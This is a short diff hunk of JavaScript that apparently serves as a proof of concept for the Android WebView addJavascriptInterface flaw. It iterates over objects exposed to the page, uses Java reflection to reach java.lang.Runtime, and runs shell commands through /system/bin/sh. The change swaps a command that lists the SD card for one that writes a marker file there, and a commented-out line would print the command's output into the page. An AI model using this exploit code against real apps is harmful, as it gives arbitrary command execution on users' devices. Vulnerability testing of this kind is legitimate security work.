@@ -16,7 +16,7 @@ function check()
 		try {
 			if ("getClass" in window[obj]) {
 				try{
-          var res = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
+          var res = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/system/bin/sh", "-c", "touch /mnt/sdcard/aaaaa"]);
          <!-- document.write(getContents(res.getInputStream())); -->
          document.write("hello world!");
 					res = 1;
